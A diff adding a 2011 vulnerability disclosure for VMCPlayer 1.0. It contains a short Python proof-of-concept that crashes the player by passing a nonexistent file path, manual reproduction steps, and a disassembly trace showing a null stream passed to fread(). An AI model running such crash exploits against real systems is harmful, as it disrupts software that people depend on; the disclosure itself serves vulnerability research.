@@ -1,0 +1,66 @@
+# done by BraniX <branix@hackers.org.pl>
+# www.hackers.org.pl
+# found: 2011.03.22
+# published: 2011.03.22
+# tested on: Windows XP SP3 Home Edition
+
+# App: VMCPlayer 1.0
+# App Url: http://files.videomobileconverter.com/vmcplayer.exe
+# VMCPlayer.exe MD5: 8a98ffbb404731f8f5ffbf3eaf30a327
+
+# VMCPlayer can be DoS'ed in two (or probably more) ways
+# 1. [No user interaction required] Pass invalid file path during start-up process
+# 2. [User interaction required] Manually enter invalid file name to OpenFileDialog 
+
+import os
+
+path = '"C:\\Program Files\\VideoMobileConverter\\VMCPlayer\\VMCPlayer.exe"'
+
+print "Trying to start VMCPlayer from path:"
+print path
+print "No user actions are required (OK, one is - click OK in MessageBox ;) )"
+
+os.system(path + " ImAGhostFilePickMe")
+
+print "Done, if nothing happened update VMCPlayer path in PY file ;)"
+
+How to DoS VMCPlayer 1.0
+1. Start VMCPlayer
+2. Click button 'Open video'
+3. (DO NOT PICK A FILE) In file name TextBox enter 'IHaveNoSuchFile' or other non-existing file name :)
+4. 'Open' non-existing file
+5. You have DoS
+
+What happened?
+
+Null pointer was passed to fread() function as a FILE* stream which caused DoS
+
+size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );
+
+00409EE0 Main     MOV EAX,DWORD PTR DS:[ECX+8]              ; EAX=00000000
+00409EE3 Main     MOV ECX,DWORD PTR SS:[ESP+8]              ; ECX=00008000
+00409EE7 Main     MOV EDX,DWORD PTR SS:[ESP+4]              ; EDX=023D5F08
+00409EEB Main     PUSH EAX                                  ; stream = NULL; ESP=0012E87C
+00409EEC Main     PUSH ECX                                  ; n = 8000 (32768.); ESP=0012E878
+00409EED Main     PUSH 1                                    ; size = 1; ESP=0012E874
+00409EEF Main     PUSH EDX                                  ; ptr = 023D5F08; ESP=0012E870
+00409EF0 Main     CALL DWORD PTR DS:[<&MSVCR80.fread>]      ; ESP=0012E86C
+
+Exception was not handled by user's code, so application was forced to close 
+
+781389EF Main     CALL DWORD PTR DS:[<&KERNEL32.IsDebuggerPresent>]; EAX=00000001
+781389F5 Main     PUSH 0                                    ; ESP=0012E4D8
+781389F7 Main     MOV ESI,EAX                               ; ESI=00000001
+781389F9 Main     CALL DWORD PTR DS:[<&KERNEL32.SetUnhandledExceptionFilter>]; FL=PZ, EAX=0040C6FE, ECX=00008289, EDX=7C90E514, ESP=0012E4DC
+781389FF Main     LEA EAX,DWORD PTR SS:[EBP-30]             ; EAX=0012E530
+78138A02 Main     PUSH EAX                                  ; ESP=0012E4D8
+78138A03 Main     CALL DWORD PTR DS:[<&KERNEL32.UnhandledExceptionFilter>]; EAX=00000000, ECX=7C864938, ESP=0012E4DC
+78138A09 Main     TEST EAX,EAX
+78138A0B Main     JNZ SHORT MSVCR80.78138A19
+78138A0D Main     TEST ESI,ESI                              ; FL=0
+78138A0F Main     JNZ SHORT MSVCR80.78138A19
+78138A19 Main     PUSH C000000D                             ; ESP=0012E4D8
+78138A1E Main     CALL DWORD PTR DS:[<&KERNEL32.GetCurrentProcess>]; FL=PS, EAX=FFFFFFFF
+78138A24 Main     PUSH EAX                                  ; ESP=0012E4D4
+78138A25 Main     CALL DWORD PTR DS:[<&KERNEL32.TerminateProcess>]; FL=P, EAX=00000000, ECX=0039B9B8, EBX=00000000, ESP=022AFF70, 
+    
